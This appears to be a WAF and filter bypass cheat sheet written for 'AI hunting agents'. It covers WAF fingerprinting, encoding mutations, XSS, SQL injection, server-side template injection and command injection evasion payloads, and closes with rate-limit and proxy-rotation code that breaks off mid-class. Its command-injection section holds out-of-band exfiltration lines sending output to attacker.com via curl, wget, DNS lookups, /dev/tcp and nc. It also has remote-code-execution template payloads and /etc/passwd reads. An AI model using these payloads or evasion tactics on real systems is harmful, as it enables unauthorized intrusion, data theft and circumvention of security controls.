# WAF & Defense Bypass Techniques Reference

> **Document Version**: 2025.1 | **Purpose**: Comprehensive bypass reference for AI hunting agents
>
> Techniques for evading WAFs, filters, input validation, and rate limiting during security testing.

---

## Table of Contents

1. [WAF Fingerprinting](#1-waf-fingerprinting)
2. [Encoding & Mutation Techniques](#2-encoding--mutation-techniques)
3. [XSS-Specific Bypasses](#3-xss-specific-bypasses)
4. [SQL Injection-Specific Bypasses](#4-sql-injection-specific-bypasses)
5. [Command Injection Evasion](#5-command-injection-evasion)
6. [Rate Limit & Throttling Evasion](#6-rate-limit--throttling-evasion)

---

## 1. WAF Fingerprinting

### 1.1 Error Page Analysis

#### WAF Response Code Patterns

| WAF | Block Response Code | Characteristic Response Body |
|-----|-------------------|------------------------------|
| **Cloudflare** | 403, 503 | "Please enable cookies." / "Attention Required!" / Ray ID |
| **AWS WAF** | 403, 414 | Minimal, often just "Forbidden" with RequestId |
| **Akamai** | 403, 406 | "Access Denied" / Reference # / Akamai error codes |
| **Imperva** | 406, 501 | "Attack Detected" / Incident ID / CAPTCHA page |
| **Sucuri** | 403 | "Access Denied - Sucuri Website Firewall" / Cloudproxy |
| **F5 ASM** | 406 | "The requested URL was rejected" / Support ID |
| **ModSecurity** | 406, 501 | "Not Acceptable" / Apache error page |
| **Barracuda** | 404, 406 | Custom page with Barracuda reference |
| **Fastly** | 403 | Minimal, cached responses with X-Served-By |
| **Fortinet** | 403, 418 | "Forbidden" with FortiGuard reference |
| **Palo Alto** | 403 | "Threat Prevention" / Application and Threat Research |
| **Citrix NetScaler** | 403 | Custom block page with AppFirewall reference |
| **Radware** | 403, 307 | CAPTCHA challenge, redirect to validation |

#### Fingerprinting via Malicious Payloads

```bash
# === Technique 1: Standard XSS payload ===
curl -s -w "%{http_code}" -o response.html "https://target.com/?q=<script>alert(1)</script>"
# Analyze: response code, body content, headers

# === Technique 2: SQL injection payload ===
curl -s -w "%{http_code}" -o response.html "https://target.com/?q=' UNION SELECT NULL--"
curl -s -w "%{http_code}" -o response.html "https://target.com/?q=1 AND 1=1"
curl -s -w "%{http_code}" -o response.html "https://target.com/?q=1 AND 1=2"

# === Technique 3: Path traversal payload ===
curl -s -w "%{http_code}" -o response.html "https://target.com/?file=../../../etc/passwd"

# === Technique 4: Command injection payload ===
curl -s -w "%{http_code}" -o response.html "https://target.com/?cmd=;whoami;"

# === Technique 5: Null byte injection ===
curl -s -w "%{http_code}" -o response.html "https://target.com/?q=%00<script>"

# Compare all responses:
# - Same response code for all = possible WAF
# - Different response for some = partial WAF or app-level filtering
# - All 200 with no filtering = no WAF detected
```

### 1.2 Response Timing Differences

```bash
# === Technique: Measure response time with and without payload ===

# Baseline (benign request):
time curl -s "https://target.com/?q=test" > /dev/null
# Result: ~0.1s

# Malicious payload:
time curl -s "https://target.com/?q=<script>alert(1)</script>" > /dev/null
# Result: ~0.5s (WAF processing adds latency)

# WAF typically adds 50-500ms for:
# - Request analysis
# - Signature matching
# - Virtual patching checks

# === Timing-based WAF detection script ===
for payload in "test" "<script>" "UNION" "../../../"; do
    echo "Testing: $payload"
    for i in {1..5}; do
        curl -s -w "%{time_total}\n" -o /dev/null "https://target.com/?q=$payload"
    done | awk '{sum+=$1; count++} END {print "Average: " sum/count "s"}'
done
```

### 1.3 Header Inspection

#### WAF Identification Headers

```bash
# === Check for WAF headers ===
curl -sI "https://target.com" | grep -iE \
"(server|via|x-cache|x-cdn|cf-ray|x-sucuri|x-iinfo|x-waf|x-firewall|
x-protected-by|x-barracuda|x-aspnet-version|x-amz-cf-id|x-edge-|akamai|
strict-transport-security|expect-ct|report-to|nel|x-request-id)"

# === Specific header signatures ===

# Cloudflare:
# CF-RAY: 5c5e6f7g8h9i0j1k-LAX
# CF-Cache-Status: DYNAMIC
# Expect-CT: max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"

# AWS WAF / CloudFront:
# X-AMZ-CF-ID: abcdef1234567890==
# X-Cache: Miss from cloudfront
# Via: 1.1 abcdef1234567890.cloudfront.net (CloudFront)

# Akamai:
# X-Akamai-Request-BC: a=2.3.4.5
# X-Akamai-Transformed: 9 123 0 pmb=mRUM,1
# Server: AkamaiGHost

# Imperva/Incapsula:
# X-Iinfo: 9-12345678-0 PNNN RT(1234567890123 12345) q(0 0 0 -1) r(1 -1)
# X-CDN: Incapsula

# Sucuri:
# X-Sucuri-ID: 1234
# X-Sucuri-Cache: BYPASS
# Server: Sucuri/Cloudproxy

# Fastly:
# X-Served-By: cache-lax12345-LAX
# X-Cache: MISS, HIT
# X-Cache-Hits: 0, 1

# F5 BIG-IP:
# Server: BigIP
# X-WA-Info: [V2,S12345]
# X-Cnection: close

# ModSecurity:
# Server: Apache/2.4.x (Ubuntu) OpenSSL/1.1.x mod_security/2.9.x
# May have: X-Mod-Security: [status] "Message"

# Fortinet FortiWeb:
# X-Frame-Options: SAMEORIGIN
# X-XSS-Protection: 1; mode=block
# Server: FortiWeb
```

### 1.4 Behavior-Based Identification

```bash
# === Technique 1: Cookie challenges ===
# Many WAFs set cookies on first visit:
curl -sI "https://target.com" | grep -i "set-cookie"
# Look for:
# __cfduid, __cf_bm (Cloudflare)
# visid_incap_*, incap_ses_* (Imperva)
# sucuri_cloudproxy_uuid_* (Sucuri)
# AWSALB, AWSALBCORS (AWS ALB)
# BIGipServer* (F5)
# TS* (Citrix)
# acunetixCookie (Acunetix WAF)

# === Technique 2: JavaScript challenges ===
curl -s "https://target.com" | grep -ioE "(challenge|javascript|cf-challenge|captcha|jschl)" | head -5
# Cloudflare: JavaScript challenge page (__cf_chl_jschl_tk__)
# Sucuri: JavaScript challenge (sucuri_cloudproxy_js_*)

# === Technique 3: Rate limiting behavior ===
for i in {1..100}; do
    curl -s -o /dev/null -w "%{http_code} " "https://target.com/?q=test"
done
# Watch for: 429 responses, connection drops, IP blocking

# === Technique 4: CAPTCHA integration ===
curl -s "https://target.com/?q=<script>alert(1)</script>" | grep -ioE "(recaptcha|hcaptcha|captcha|g-recaptcha)" | head -5

# === Technique 5: Response consistency ===
# WAF responses are more consistent than application errors
for i in {1..10}; do
    curl -s "https://target.com/?q='UNIONSELECT" | wc -c
done
# If all responses are exactly the same size, WAF is likely
```

---

## 2. Encoding & Mutation Techniques

### 2.1 URL Encoding

#### Single URL Encoding

```
Standard character    URL-encoded
<                     %3C
>                     %3E
"                     %22
'                     %27
(                     %28
)                     %29
{                     %7B
}                     %7D
[                     %5B
]                     %5D
|                     %7C
\                     %5C
^                     %5E
~                     %7E
`                     %60
;                     %3B
/                     %2F
?                     %3F
:                     %3A
@                     %40
=                     %3D
&                     %26
#                     %23
%                     %25
space                 %20 or +
newline               %0A or %0D
```

#### Double URL Encoding

```
Character     Single      Double
<             %3C         %253C
>             %3E         %253E
"             %22         %2522
'             %27         %2527
(             %28         %2528
)             %29         %2529
```

#### Nested/Recursive Encoding

```
< = %3C (single)
< = %253C (double)
< = %%33%43 (mixed)
< = %25%33%43 (triple component)
< = %u003C (Unicode URI encoding)
< = \u003c (JavaScript Unicode)
< = \x3c (JavaScript hex)
< = \74 (JavaScript octal)
```

**WAF Bypass Strategy**: If WAF decodes once but application decodes twice:
- WAF sees `%253C` → decodes to `%3C` (safe-looking)
- App sees `%253C` → decodes to `%3C` → then `<` (dangerous)

### 2.2 HTML Entity Encoding

#### Named Entities

```html
<!-- Standard entities -->
&lt;      <!-- < -->
&gt;      <!-- > -->
&quot;     <!-- " -->
&apos;    <!-- ' -->
&amp;     <!-- & -->
&nbsp;    <!-- space -->

<!-- Less common but valid -->
&LT;      <!-- case-insensitive: < -->
&Gt;      <!-- > -->
&QUOT;    <!-- " -->
&APOS;    <!-- ' -->

<!-- Numeric character reference (decimal) -->
&#60;     <!-- < -->
&#62;     <!-- > -->
&#34;     <!-- " -->
&#39;     <!-- ' -->
&#40;     <!-- ( -->
&#41;     <!-- ) -->

<!-- Hexadecimal reference -->
&#x3C;    <!-- < -->
&#x3E;    <!-- > -->
&#x22;    <!-- " -->
&#x27;    <!-- ' -->
&#x28;    <!-- ( -->
&#x29;    <!-- ) -->

<!-- With leading zeros -->
&#0000060;  <!-- < -->
&#x00003C;  <!-- < -->

<!-- Without semicolon (browser-dependent) -->
&#60        <!-- < (works in most browsers) -->
&#x3C       <!-- < -->
&lt         <!-- < -->
```

### 2.3 Unicode Normalization Abuse

#### Unicode Equivalence Attacks

```javascript
// Characters that normalize to ASCII equivalents
\uFF1C  // ＜ FULLWIDTH LESS-THAN SIGN → normalizes to <
\uFE64  // ﹤ SMALL LESS-THAN SIGN → normalizes to <
\uFF1E  // ＞ FULLWIDTH GREATER-THAN SIGN → normalizes to >
\uFE65  // ﹥ SMALL GREATER-THAN SIGN → normalizes to >
\uFF02  // ＂ FULLWIDTH QUOTATION MARK → normalizes to "
\uFF07  // ＇ FULLWIDTH APOSTROPHE → normalizes to '
\uFF06  // ＆ FULLWIDTH AMPERSAND → normalizes to &

// XSS with fullwidth characters:
＜script＞alert(1)＜/script＞

// Homoglyph attacks (Cyrillic lookalikes)
// Latin 'a' (U+0061) vs Cyrillic 'а' (U+0430)
ѕсrіpt  // Cyrillic characters look like "script"
јаvascript:  // Mixed script

// Decomposition attacks
// U+212B (Angstrom sign Å) decomposes to A + combining ring
// U+00C5 (Latin A with ring) also decomposes similarly
// Can be used to bypass exact string matching
```

#### Unicode Escapes in Different Contexts

```javascript
// JavaScript Unicode escapes
\u003cscript\u003ealert(1)\u003c/script\u003e
\x3cscript\x3ealert(1)\x3c/script\x3e

// JSON Unicode
"\u003cscript\u003ealert(1)\u003c/script\u003e"

// CSS Unicode
\3c script\3e { color: red; }

// HTML Unicode
&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;
```

### 2.4 Case Variation and Randomization

```javascript
// === XSS case variation ===
<ScRiPt>alert(1)</ScRiPt>
<sCrIpT>alert(1)</ScRiPt>
<IMG SRC=x ONERROR=alert(1)>
<svg OnLoAd=alert(1)>

// === SQL case variation ===
UnIoN SeLeCt NuLl
uNiOn AlL sElEcT
AnD 1=1
Or 1=1

// === Case randomization for WAF evasion ===
// Many WAFs use case-sensitive signatures
// Randomizing case can bypass signature matching
function randomizeCase(input) {
    return input.split('').map(c =>
        Math.random() > 0.5 ? c.toUpperCase() : c.toLowerCase()
    ).join('');
}

// Example output:
// <sCrIpT>AlErT(1)</ScRiPt>
// uNiOn SeLeCt NuLl,VeRsIoN()
```

### 2.5 Tab, Newline, and Null Byte Injection

```javascript
// === Whitespace alternatives ===
// Tab (%09)
<img%09src=x%09onerror=alert(1)>

// Newline (%0a)
<img%0asrc=x%0aonerror=alert(1)>

// Carriage return (%0d)
<img%0dsrc=x%0donerror=alert(1)>

// Form feed (%0c)
<img%0csrc=x%0conerror=alert(1)>

// Vertical tab (%0b)
<img%0bsrc=x%0bonerror=alert(1)>

// Multiple whitespace
<img%0d%0asrc=x%0d%0aonerror=alert(1)>

// === Null byte injection ===
// In PHP < 5.3.4:
../../../etc/passwd%00.jpg
<script>alert(1)</script>%00.txt

// In file upload:
shell.php%00.jpg

// === Comment injection (SQL) ===
UN/**/ION/**/SELECT/**/NULL
UN%0aION%0aSELECT%0aNULL
UN%0dION%0dSELECT%0dNULL
UN%0cION%0cSELECT%0cNULL
UN%0bION%0bSELECT%0bNULL
```

---

## 3. XSS-Specific Bypasses

### 3.1 Tag Name Mutation

```html
<!-- === Case mixing === -->
<iMg SrC=x OnErRoR=alert(1)>
<ScRiPt>alert(1)</ScRiPt>
<SVg OnLoAd=alert(1)>
<MaRpUeE OnStArT=alert(1)>

<!-- === Tag omission (HTML5 parsing) === -->
<img/src=x/onerror=alert(1)>
<svg/onload=alert(1)>
<br/style=width:expression(alert(1))>

<!-- === Self-closing variation === -->
<img src=x onerror=alert(1)/>
<img src=x onerror=alert(1) />

<!-- === Uncommon HTML5 tags === -->
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<meter onforminput=alert(1)>
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>
<source onerror=alert(1)>
<track onerror=alert(1)>
<iframe src=javascript:alert(1)>
<object data=javascript:alert(1)>
<embed src=javascript:alert(1)>

<!-- === Math/SVG namespace tricks === -->
<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>--></style>
<svg><desc><table><caption><style><!--</style><img src=x onerror=alert(1)>--></style>

<!-- === Foreign object === -->
<svg><foreignObject><body onload=alert(1)></foreignObject></svg>
```

### 3.2 Event Handler Alternatives

```javascript
// === Standard event handlers ===
onerror=alert(1)
onload=alert(1)
onclick=alert(1)
onmouseover=alert(1)
onfocus=alert(1)

// === Less common event handlers ===
ontoggle=alert(1)        // <details> element
onstart=alert(1)         // <marquee> element
onfinish=alert(1)        // <marquee> element
onerror=alert(1)         // <img>, <video>, <audio>, <source>, <track>
onload=alert(1)          // <body>, <iframe>, <img>, <input>, <link>, <script>, <style>
onpageshow=alert(1)      // <body>
onpagehide=alert(1)      // <body>
onfocus=alert(1)         // Most interactive elements
onblur=alert(1)          // Most interactive elements
onchange=alert(1)        // <input>, <select>, <textarea>
oninput=alert(1)         // <input>, <textarea>
oninvalid=alert(1)       // <form> elements
onsearch=alert(1)        // <input type="search">
onselect=alert(1)        // <input>, <textarea>
onsubmit=alert(1)        // <form>
onreset=alert(1)         // <form>
onforminput=alert(1)     // <form>, <input>
onformchange=alert(1)    // <form>
oncontextmenu=alert(1)   // Most elements
ondrag=alert(1)          // Most elements
ondragstart=alert(1)     // Most elements
ondrop=alert(1)          // Most elements
onmouseenter=alert(1)    // Most elements
onmouseleave=alert(1)    // Most elements
onmousemove=alert(1)     // Most elements
onmousedown=alert(1)     // Most elements
onmouseup=alert(1)       // Most elements
onwheel=alert(1)         // Most elements
onscroll=alert(1)        // Most elements
onresize=alert(1)        // <body>
onhashchange=alert(1)    // <body>
onpopstate=alert(1)      // <body>
onmessage=alert(1)       // <body>
onstorage=alert(1)       // <body>
ononline=alert(1)        // <body>
onoffline=alert(1)       // <body>
onbeforeunload=alert(1)  // <body>
onunload=alert(1)        // <body>

// === CSS animation events ===
onanimationstart=alert(1)
onanimationend=alert(1)
onanimationiteration=alert(1)
ontransitionend=alert(1)
ontransitionstart=alert(1)

// === Pointer events ===
onpointerdown=alert(1)
onpointerup=alert(1)
onpointermove=alert(1)
onpointerover=alert(1)
onpointerout=alert(1)
onpointerenter=alert(1)
onpointerleave=alert(1)

// === Media events ===
onplay=alert(1)          // <audio>, <video>
onplaying=alert(1)
onpause=alert(1)
onwaiting=alert(1)
onseeking=alert(1)
onseeked=alert(1)
onended=alert(1)
onloadedmetadata=alert(1)
onloadeddata=alert(1)
oncanplay=alert(1)
oncanplaythrough=alert(1)
onstalled=alert(1)
onsuspend=alert(1)
onvolumechange=alert(1)
onratechange=alert(1)
onemptied=alert(1)
onabort=alert(1)
onencrypted=alert(1)
onwaitingforkey=alert(1)

// === Clipboard events ===
oncopy=alert(1)
oncut=alert(1)
onpaste=alert(1)

// === Print events ===
onbeforeprint=alert(1)
onafterprint=alert(1)
```

### 3.3 Protocol Bypass

```javascript
// === javascript: protocol ===
<a href="javascript:alert(1)">click</a>
<a href="javascript://%0aalert(1)">click</a>
<a href="javascript://target.com%0aalert(1)">click</a>
<a href="javascript:alert(1)//https://target.com">click</a>

// === data: protocol ===
<a href="data:text/html,<script>alert(1)</script>">click</a>
<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">click</a>
<iframe src="data:text/html,<script>alert(1)</script>"></iframe>

// === vbscript: protocol (IE only) -->
<a href="vbscript:MsgBox(1)">click</a>

// === view-source: protocol -->
<a href="view-source:javascript:alert(1)">click</a>

// === blob: protocol -->
<script>
URL.createObjectURL(new Blob(['<script>alert(1)</' + 'script>'], {type: 'text/html'}));
</script>
```

### 3.4 Comment and Whitespace Tricks

```html
<!-- === HTML comment tricks === -->
<!--><img src=x onerror=alert(1)>-->
<!-- --><img src=x onerror=alert(1)>
<![CDATA[<img src=x onerror=alert(1)>]]>
<![CDATA[]]><img src=x onerror=alert(1)><![CDATA[]]>

<!-- === CDATA trick in XML context === -->
<xml>
<![CDATA[
]]><script>alert(1)</script><![CDATA[
]]>
</xml>

<!-- === Comment-based bypass of filters === -->
<scr<!--ipt>alert(1)</scr<!--ipt>
<s<!--cri-->pt>alert(1)</s<!--cri-->pt>

<!-- === Whitespace-only bypass === -->
<img src=x onerror = alert(1)>
<img src=x onerror	=	alert(1)>
<img src=x onerror
=
alert(1)>

<!-- === Encoding in attributes === -->
<img src=x onerror="alert&#40;1&#41;">
<img src=x onerror="alert&#x28;1&#x29;">
<img src=x onerror="eval('\x61\x6c\x65\x72\x74\x28\x31\x29')">
<img src=x onerror="eval(atob('YWxlcnQoMSk='))">

<!-- === Obfuscated event handlers === -->
<img src=x onerror	=alert(1)>
<img/src=x onerror=alert(1)>
<img src=x:onerror=alert(1)>
<img src=x `` onerror=alert(1)>
```

### 3.5 Template Injection Context Exploitation

```javascript
// === AngularJS 1.x ===
{{constructor.constructor('alert(1)')()}}
{{$on.constructor('alert(1)')()}}
{{$eval.constructor('alert(1)')()}}
{{alert(1)}}
{{constructor.constructor('alert(1)')()}}
{{_constructor.constructor('alert(1)')()}}

// Vue.js
{{constructor.constructor('alert(1)')()}}
{{_openBlock.constructor('alert(1)')()}}
{{_c.constructor('alert(1)')()}}

// React (dangerouslySetInnerHTML)
// If user input reaches dangerouslySetInnerHTML, direct HTML injection works

// Mithril.js
{m: console.log(1)}
{m: constructor.constructor('alert(1)')()}

// Ractive.js
{{#exec}}alert(1){{/exec}}

// Handlebars
{{#with "constructor" as |c|}}{{#with (c.constructor "return alert(1)") as |f|}}{{f}}{{/with}}{{/with}}

// Twig (PHP)
{{_self.env.setCache("ftp://attacker.com:21/")}}
{{_self.env.loadTemplate("template")}}

// Jinja2 (Python)
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{''.__class__.__mro__[1].__subclasses__()}}
{{lipsum.__globals__.os.popen('id').read()}}

// Smarty (PHP)
{php}echo `id`;{/php}
{$smarty.template_object->fetch('file:/etc/passwd')}
```

---

## 4. SQL Injection-Specific Bypasses

### 4.1 Comment Styles by Database

```sql
-- === MySQL comments ===
SELECT/**/1    -- Inline comment as whitespace
SELECT/*!500001*/  -- Versioned comment (executed in MySQL 5.0+)
SELECT/*!507001*/  -- Versioned for 5.7+
SELECT#comment   -- Hash comment
SELECT-- comment\n1  -- Double-dash comment (requires space after --)

-- === PostgreSQL comments ===
SELECT/**/1    -- Inline comment
SELECT-- comment
1              -- Double-dash comment
/* comment */ SELECT 1  -- C-style comment

-- === MSSQL comments ===
SELECT/**/1    -- Inline comment
SELECT-- comment
1              -- Double-dash comment
/* comment */ SELECT 1  -- C-style comment

-- === Oracle comments ===
SELECT/**/1    -- Inline comment
SELECT-- comment
1              -- Double-dash comment
/* comment */ SELECT 1  -- C-style comment
REM comment    -- SQL*Plus only

-- === SQLite comments ===
SELECT/**/1    -- Inline comment
SELECT-- comment
1              -- Double-dash comment
/* comment */ SELECT 1  -- C-style comment
```

### 4.2 String Concatenation Techniques

```sql
-- === MySQL ===
CONCAT('a','b')
CONCAT_WS('', 'a', 'b')
'a' 'b'        -- Space-separated (implicit concat)
'a'\|\|'b'      -- Also works in some modes

-- === PostgreSQL ===
'a' \|\| 'b'
CONCAT('a', 'b')
FORMAT('%s%s', 'a', 'b')

-- === MSSQL ===
'a' + 'b'
CONCAT('a', 'b')
'a' 'b'        -- Only in some contexts

-- === Oracle ===
'a' \|\| 'b'
CONCAT('a', 'b')
'a' \|\| 'b'

-- === SQLite ===
'a' \|\| 'b'
'a' 'b'
CONCAT('a', 'b')  -- SQLite 3.44+

-- === Bypass techniques ===
-- If CONCAT is filtered, use alternatives:
'se' 'lect'    -- MySQL implicit concat
'se'+'lect'    -- MSSQL
'se'\|\|'lect'  -- PostgreSQL, Oracle
CHAR(115)+CHAR(101)  -- ASCII construction (MSSQL)

-- CHAR() equivalents:
-- MySQL: CHAR(115,101,108,101,99,116) → 'select'
-- PostgreSQL: CHR(115)\|\|CHR(101) → 'se'
-- MSSQL: CHAR(115)+CHAR(101) → 'se'
-- Oracle: CHR(115)\|\|CHR(101) → 'se'
-- SQLite: CHAR(115,101) → 'se'
```

### 4.3 Whitespace Alternatives

```sql
-- === Whitespace replacement ===
SELECT/**/1  -- Comment as space (universal)
SELECT%0a1   -- Newline
SELECT%0d1   -- Carriage return
SELECT%0c1   -- Form feed
SELECT%0b1   -- Vertical tab
SELECT%091   -- Tab
SELECT(1)    -- Parentheses
SELECT`1`    -- Backticks (MySQL)
SELECT%201   -- Regular space

-- === In WHERE clauses ===
WHERE/**/1=1
WHERE%0a1=1
WHERE(1)=(1)
WHERE`id`=1  -- MySQL

-- === In UNION statements ===
UNION/**/SELECT/**/NULL
UNION%0aSELECT%0aNULL
UNION(SELECT(NULL))
UNION%0bSELECT%0bNULL
```

### 4.4 Logical Operator Alternatives

```sql
-- === AND alternatives ===
SELECT 1 AND 1
SELECT 1&&1        -- MySQL
SELECT 1&1         -- Bitwise AND (different semantics)
SELECT 1*1         -- Multiply (truthy)
SELECT 1/*!50000AND*/1  -- Versioned comment

-- === OR alternatives ===
SELECT 1 OR 1
SELECT 1||1        -- MySQL, SQLite, PostgreSQL
SELECT 1\|\|1       -- Oracle, PostgreSQL
SELECT 1\|1         -- Bitwise OR

-- === Comparison operators ===
SELECT 1=1
SELECT 1<>0        -- Not equal
SELECT 1<=>1       -- NULL-safe equal (MySQL)
SELECT 1 IN(1)     -- Membership test
SELECT 1 BETWEEN 1 AND 1
SELECT ISNULL(1,0)  -- MSSQL
SELECT IFNULL(1,0)  -- MySQL, SQLite
SELECT COALESCE(1)  -- Universal

-- === String comparison ===
SELECT 'a'='a'
SELECT 'a'<=>'a'   -- MySQL
SELECT 'a' LIKE 'a'
SELECT STRCMP('a','a')  -- MySQL
SELECT 'a' REGEXP 'a'   -- MySQL

-- === Truthy values ===
SELECT 1           -- True
SELECT 'a'         -- True (in boolean context)
SELECT TRUE        -- MySQL, PostgreSQL
SELECT 1=1         -- True
SELECT NOT 0       -- True
```

### 4.5 CASE WHEN/THEN/ELSE Injection

```sql
-- === CASE expression injection ===
-- Can be used for blind SQL injection without SLEEP()

SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END
SELECT CASE WHEN (SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a') THEN 1 ELSE 0 END

-- === In ORDER BY ===
ORDER BY CASE WHEN (1=1) THEN id ELSE price END

-- === In SELECT ===
SELECT CASE WHEN (1=1) THEN username ELSE password END FROM users

-- === Database-specific syntax ===

-- MySQL:
SELECT IF(1=1, 1, 0)
SELECT IFNULL(NULL, 1)
SELECT NULLIF(1, 2)

-- PostgreSQL:
SELECT CASE WHEN 1=1 THEN 1 ELSE 0 END
SELECT NULLIF(1, 2)
SELECT COALESCE(NULL, 1)

-- MSSQL:
SELECT CASE WHEN 1=1 THEN 1 ELSE 0 END
SELECT IIF(1=1, 1, 0)
SELECT ISNULL(NULL, 1)

-- Oracle:
SELECT CASE WHEN 1=1 THEN 1 ELSE 0 END FROM dual
SELECT DECODE(1, 1, 'true', 'false') FROM dual
SELECT NVL(NULL, 1) FROM dual

-- SQLite:
SELECT CASE WHEN 1=1 THEN 1 ELSE 0 END
SELECT COALESCE(NULL, 1)
SELECT IFNULL(NULL, 1)
SELECT IIF(1=1, 1, 0)  -- SQLite 3.32+
```

### 4.6 Filtered Keyword Bypass

```sql
-- === SELECT bypass ===
SELESELECTCT  -- If 'SELECT' is replaced with ''
SEL/**/ECT
%53%45%4C%45%43%54  -- URL-encoded
SEL%0bECT
SELE%0aCT

-- === UNION bypass ===
UNIUNIONON  -- Replacement bypass
UNI/**/ON
%55%4E%49%4F%4E
UN%0aION

-- === ORDER BY bypass ===
ORDORDER BYER BY  -- Replacement bypass
ORDER/**/BY
`ORDER` BY  -- MySQL backtick

-- === FROM bypass ===
FRFROMOM
FR%0aOM

-- === WHERE bypass ===
WHWHEREERE
WH%0aERE

-- === Information schema bypass ===
-- MySQL:
mysql.innodb_table_stats  -- Alternative to information_schema
sys.x$schema_table_statistics

-- PostgreSQL:
pg_catalog.pg_tables
pg_catalog.pg_attribute

-- MSSQL:
sys.tables
sys.columns

-- Oracle:
all_tables
all_tab_columns

-- SQLite:
sqlite_master
sqlite_schema (SQLite 3.33+)
```

---

## 5. Command Injection Evasion

### 5.1 Shell Metacharacter Substitution

```bash
# === Command separators ===
cmd1; cmd2       # Semicolon
cmd1 && cmd2     # AND operator
cmd1 \|\| cmd2     # OR operator
cmd1 | cmd2      # Pipe
cmd1 & cmd2      # Background (may not wait for output)
`cmd1`           # Backtick substitution
$(cmd1)          # Dollar-parenthesis substitution
$((cmd1))        # Arithmetic expansion (in some contexts)

# === Filtered separator bypass ===
cmd1${IFS}cmd2   # ${IFS} is space, tab, newline
cmd1$IFS$2cmd2   # $IFS$9 is also space
cmd1%0acmd2      # URL-encoded newline
cmd1%3bcmd2      # URL-encoded semicolon

# === Whitespace alternatives ===
cmd${IFS}arg     # ${IFS} as space
cmd$IFS$2arg     # $IFS$9 as space
cmd%09arg        # Tab
cmd%0aarg        # Newline
cmd</**/dev/**/null  # Comment as space (in some contexts)

# === Bypass common filters ===
# Filter: ;
# Bypass: &&, ||, |, newline, ${IFS}
whoami && id
whoami || id
whoami | cat
echo $(whoami)

# Filter: && and ||
# Bypass: ;, |, newline, backticks
whoami; id
whoami | id
`whoami`

# Filter: spaces
# Bypass: ${IFS}, $IFS$9, <, {cmd,arg}
whoami${IFS}-a
whoami$IFS$2-a
{whoami,-a}
cat</etc/passwd

# Filter: all of the above
# Bypass: encoded forms
whoami%26%26id   # URL-encoded &&
whoami%3bid      # URL-encoded ;
$(printf%20'%s'%20'whoami')  # Using printf
```

### 5.2 Backtick and $() Alternatives

```bash
# === Backtick execution ===
`whoami`
echo `whoami`
echo ``whoami``  # Double backtick (works in some shells)

# === Dollar-parenthesis ===
$(whoami)
echo $(whoami)
echo $((whoami))  # Arithmetic (may not work)

# === Dollar-brace execution (bash) ===
${COLUMNS:-$(whoami)}
${PATH:+$(whoami)}

# === Process substitution ===
cat <(whoami)

# === Here-string ===
tr -d ' ' <<< $(whoami)
```

### 5.3 Encoding Tricks

```bash
# === Using printf ===
$(printf '%s' 'whoami')
$(printf '%b' 'who\x61mi')  # Hex escape
$(printf '%s' 'w' 'h' 'o' 'a' 'm' 'i')

# === Using xxd ===
$(echo '77686f616d69' | xxd -r -p)  # hex decode → whoami

# === Using base64 ===
$(echo 'd2hvYW1p' | base64 -d)  # base64 decode → whoami

# === Using octal ===
$(printf '%b' '\167\150\157\141\155\151')  # octal → whoami

# === Using awk ===
$(awk 'BEGIN{system("whoami")}')

# === Using sed ===
$(echo 'whoami' | sed 's/.*/&/e')  # GNU sed with 'e' flag

# === Using perl ===
$(perl -e 'system("whoami")')

# === Using python ===
$(python -c 'import os; print(os.system("whoami"))')
$(python3 -c '__import__("os").system("whoami")')

# === Character-by-character construction ===
$(/???/??a??)      # /bin/whoami pattern matching
$(/???/b??)        # /bin/sh pattern matching
$(/??r/b??/???3 -c 'import os; os.system("whoami")')  # /usr/bin/python3

# === Using wildcards ===
/???/??t /??t?/p??s??  # cat /etc/passwd
```

### 5.4 Blind Command Injection Techniques

```bash
# === Time-based detection ===
ping -c 3 127.0.0.1  # Delays 3 seconds
sleep 5              # Delays 5 seconds
timeout 5 whoami     # Delays 5 seconds

# === Out-of-band detection ===
curl http://attacker.com/$(whoami)
wget http://attacker.com/$(whoami)
ping -c 1 $(whoami).attacker.com

# === DNS exfiltration ===
nslookup $(whoami).attacker.com
host $(whoami).attacker.com
dig $(whoami).attacker.com

# === File-based detection ===
whoami > /var/www/html/output.txt
# Then access: http://target.com/output.txt

# === Redirect to accessible location ===
whoami > /tmp/output
cp /tmp/output /var/www/html/

# === Using /dev/tcp (bash) ===
bash -c 'whoami > /dev/tcp/attacker.com/80'

# === Using nc ===
whoami | nc attacker.com 4444
```

---

## 6. Rate Limit & Throttling Evasion

### 6.1 Request Timing Jitter

```python
import random
import time
import asyncio

def jittered_delay(base=2.0, jitter=1.0):
    """Add random jitter to base delay"""
    delay = base + random.uniform(-jitter, jitter)
    time.sleep(max(0.1, delay))

def exponential_backoff(attempt, base=1.0, max_delay=60):
    """Exponential backoff with jitter"""
    delay = min(base * (2 ** attempt), max_delay)
    jittered_delay(delay, delay * 0.1)

def adaptive_timing(response_times):
    """Adapt timing based on server response"""
    avg_time = sum(response_times) / len(response_times)
    if avg_time > 2.0:
        # Server is slow, increase delay
        return max(5.0, avg_time * 2)
    elif avg_time < 0.5:
        # Server is fast, can decrease delay
        return max(1.0, avg_time * 3)
    return 2.0

# === AI Agent timing strategy ===
def calculate_optimal_delay(responses_history):
    """
    Calculate optimal delay based on response history.
    Goal: Maximize throughput without triggering rate limiting.
    """
    rate_limited = sum(1 for r in responses_history if r == 429)
    total = len(responses_history)
    
    if total == 0:
        return 1.0
    
    rate_limit_ratio = rate_limited / total
    
    if rate_limit_ratio > 0.1:  # > 10% rate limited
        return 10.0  # Significant backoff
    elif rate_limit_ratio > 0.05:  # > 5% rate limited
        return 5.0
    elif rate_limit_ratio > 0.01:  # > 1% rate limited
        return 2.5
    else:
        return max(0.5, 1.0 - rate_limit_ratio)
```

### 6.2 Proxy Rotation Strategies

```python
import itertools
import random

# === Proxy pool management ===
class ProxyRotator:
    def __init__(self, proxies):
        self.proxies = proxies
        self.proxy_cycle = itertools.cycle(proxies)
        self.failed_proxies = set()
        self.proxy_stats = {p: {'success': 0, 'fail': 0} for p in proxies}
    
    def get_next(self):
        """Get next working proxy"""
